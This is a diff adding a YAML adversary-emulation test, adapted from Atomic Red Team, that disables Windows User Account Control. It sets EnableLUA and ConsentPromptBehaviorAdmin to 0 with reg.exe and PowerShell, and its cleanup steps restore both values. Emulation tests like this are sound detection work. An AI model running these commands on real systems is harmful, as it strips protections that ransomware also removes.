@@ -1,0 +1,53 @@
+# Adapted from Atomic Red Team - Abuse Elevation Control Mechanism: Bypass User Account Control
+# Source: https://www.atomicredteam.io/atomic-red-team/atomics/T1548.002
+# Original auto_generated_guids: 9e8af564-53ec-407e-aaa8-3cb20c3af7f9, 251c5936-569f-42f4-9ac2-87a173b9e9b8
+
+---
+api_version: 2.0
+uuid: 81808c9e-3cce-4c05-b392-b3d8735afaa0
+name: Disable UAC via registry
+authors:
+  - isaac_fletcher
+  - Atomic Red Team
+description: |
+  Disable User Account Control (UAC) using registry modifications. This includes:
+
+  1. Disabling UAC entirely by changing EnableLUA registry key from 1 to 0
+  2. Disabling UAC admin consent prompt by setting ConsentPromptBehaviorAdmin to 0
+
+  MedusaLocker Ransomware (https://cloudsek.com/technical-analysis-of-medusalocker-ransomware/),
+  Purple Fox Rootkit (https://blogs.blackberry.com/en/2022/01/threat-thursday-purple-fox-rootkit),
+  Avaddon Ransomware (https://blogs.blackberry.com/en/2021/06/threat-thursday-avaddon-ransomware-uses-ddos-attacks-as-triple-threat)
+
+mitre:
+  tactics:
+    - TA0004 Privilege Escalation
+    - TA0005 Defense Evasion
+  techniques:
+    - T1548 Abuse Elevation Control Mechanism
+  subtechniques:
+    - T1548.002 Bypass User Account Control
+
+requirements:
+  platforms:
+    - os: windows
+  superuser: true
+
+steps:
+  - name: disable_uac_registry
+    executor: cmd.exe
+    inline: |
+      reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+    cleanup:
+      executor: cmd.exe
+      inline: |
+        reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f
+
+  - name: disable_uac_consent_prompt
+    executor: powershell
+    inline: |
+      Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0 -Type DWord -Force
+    cleanup:
+      executor: powershell
+      inline: |
+        Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 1 -Type DWord -Force
